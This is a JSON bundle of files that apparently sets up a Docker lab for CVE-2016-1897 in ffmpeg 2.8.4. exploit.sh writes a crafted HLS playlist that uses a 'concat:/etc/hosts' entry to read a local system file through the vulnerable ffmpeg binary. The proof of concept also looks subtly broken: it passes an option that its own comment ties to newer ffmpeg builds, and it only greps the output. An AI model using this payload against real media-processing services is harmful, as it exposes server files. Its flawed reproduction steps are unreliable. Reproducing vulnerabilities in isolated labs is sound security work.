{
    "files": [
        {
            "location": "./../../dockers/CVE-2016-1897/custom_no_tool/docker-compose.yml",
            "content": "services:\n  vulnerable:\n    build:\n      context: .\n      dockerfile: Dockerfile.exploit\n    ports:\n      - \"8080:8080\"\n    restart: unless-stopped"
        },
        {
            "location": "./../../dockers/CVE-2016-1897/custom_no_tool/Dockerfile.exploit",
            "content": "FROM debian:bullseye-slim\n\n# Install tools needed to download and extract a static ffmpeg binary, plus required runtime libraries\nRUN apt-get update && apt-get install -y --no-install-recommends ca-certificates curl xz-utils libstdc++ && rm -rf /var/lib/apt/lists/*\n\n# Download vulnerable ffmpeg 2.8.4 static build and install it\nENV FFMPEG_URL=\"https://johnvansickle.com/ffmpeg/releases/ffmpeg-2.8.4-64bit-static.tar.xz\"\nRUN curl -L \"$FFMPEG_URL\" -o /tmp/ffmpeg.tar.xz && \\\n    tar -xJf /tmp/ffmpeg.tar.xz -C /tmp && \\\n    mv /tmp/ffmpeg-*/ffmpeg /usr/local/bin/ffmpeg && \\\n    chmod +x /usr/local/bin/ffmpeg && \\\n    rm -f /tmp/ffmpeg.tar.xz\n\nCOPY exploit.sh /exploit.sh\nRUN chmod +x /exploit.sh\n\nEXPOSE 8080\nENTRYPOINT [\"/exploit.sh\"]"
        },
        {
            "location": "./../../dockers/CVE-2016-1897/custom_no_tool/exploit.sh",
            "content": "#!/bin/sh\n# Demonstrate CVE-2016-1897 using the vulnerable ffmpeg 2.8.4 binary\n\n# Create a malicious HLS playlist that triggers the concat protocol bug.\ncat > /tmp/malicious.m3u8 <<'EOF'\n#EXTM3U\n#EXTINF:10,\nhttp://example.com/doesnotexist\n#EXT-X-DISCONTINUITY\n#EXTINF:0,\nconcat:/etc/hosts?0\nEOF\n\necho \"Running vulnerable ffmpeg on crafted playlist...\"\n# Allow the concat, file and http protocols explicitly (required by newer ffmpeg builds)\nffmpeg -protocol_whitelist \"file,http,concat,https\" -i /tmp/malicious.m3u8 -f null - 2>&1 | grep \"request\"\n\n# Keep container alive so the exposed port stays reachable\nwhile true; do\n  sleep 3600\ndone"
        }
    ],
    "directory_tree": "CVE-2016-1897/custom_no_tool"
}